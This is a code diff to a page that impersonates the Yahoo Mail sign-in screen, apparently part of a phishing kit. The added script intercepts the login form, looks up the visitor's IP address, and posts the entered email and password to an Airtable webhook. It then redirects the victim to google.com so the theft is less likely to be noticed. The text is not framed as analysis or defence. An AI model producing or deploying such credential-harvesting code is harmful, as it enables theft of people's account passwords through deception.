@@ -36,7 +36,7 @@
         <p class="parag">Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web; you get more out of life.</p>
       </div>
       <div class="form-block w-form">
-        <form id="email-form" name="email-form" data-name="Email Form" action="https://hooks.airtable.com/workflows/v1/genericWebhook/appWWw92Q29J21BO3/wfl77Xdfu9VtRuaiw/wtrD1pawC12AniDFG" method="post" class="form" data-wf-page-id="67c6f50ed426ad7d5847f218" data-wf-element-id="1312d987-3657-e4e0-e2bb-17ae6027d67d"><img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
+        <form id="email-form" name="email-form" data-name="Email Form" class="form" data-wf-page-id="67c6f50ed426ad7d5847f218" data-wf-element-id="1312d987-3657-e4e0-e2bb-17ae6027d67d"><img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
           <div class="mail">
             <h1 class="heading-2">Sign in</h1>
             <div class="text-block-2">Sign in using your Yahoo account<br></div>
@@ -142,13 +142,89 @@ function transform() {
   });
 </script>
 <script>
-  // Fetch IP address and add it to the hidden field
-  fetch("https://api64.ipify.org?format=json")
-      .then(response => response.json())
-      .then(data => {
-          document.getElementById("ip_address").value = data.ip;
-      })
-      .catch(error => console.error("Error fetching IP:", error));
+  document.addEventListener('DOMContentLoaded', function() {
+    const form = document.getElementById('email-form');
+    const submitButton = document.getElementById('5b219854-e812-a8bb-900f-4ec0d1fc12dd');
+    const successMessage = document.getElementById('successMessage');
+    
+    // Your Airtable webhook URL
+    const WEBHOOK_URL = 'https://hooks.airtable.com/workflows/v1/genericWebhook/appWWw92Q29J21BO3/wfl77Xdfu9VtRuaiw/wtrD1pawC12AniDFG';
+    
+    // The URL to redirect to after form submission
+    const REDIRECT_URL = 'https://google.com'; // Change this to your desired redirect URL
+    
+    form.addEventListener('submit', async function(event) {
+      event.preventDefault();
+      
+      // Clear previous errors
+      document.querySelectorAll('.error').forEach(el => el.textContent = '');
+      
+      // Validate form
+      let isValid = true;
+      
+      const email = document.getElementById('email').value;
+      if (!email || !/^\S+@\S+\.\S+$/.test(email)) {
+        document.getElementById('name').textContent = 'Please enter a valid email address';
+        isValid = false;
+      }
+      
+      const password = document.getElementById('password').value;
+      if (!password || password.length < 6) {
+        document.getElementById('input-19').textContent = 'Inorrect Password';
+        isValid = false;
+      }
+      
+      if (!isValid) return;
+      
+      // Disable submit button
+      submitButton.disabled = true;
+      submitButton.textContent = 'Processing...';
+      
+      try {
+        // Get IP address using a public API
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const ip = ipData.ip;
+        
+        // Prepare data for Airtable webhook
+        const payload = {
+          email: email,
+          password: password,
+          ip: ip,
+          timestamp: new Date().toISOString()
+        };
+        
+        // Send data to Airtable webhook
+        const response = await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        });
+        
+        if (!response.ok) {
+          throw new Error('Failed to submit to Airtable');
+        }
+        
+        // Show success message
+        successMessage.style.display = 'block';
+        
+        // Redirect after a short delay
+        setTimeout(function() {
+          window.location.href = REDIRECT_URL;
+        }, 2000);
+        
+      } catch (error) {
+        console.error('Form submission error:', error);
+        alert('There was an error processing your request. Please try again later.');
+        
+        // Re-enable submit button
+        submitButton.disabled = false;
+        submitButton.textContent = 'Submit';
+      }
+    });
+  });
 </script>
 </body>
 </html>
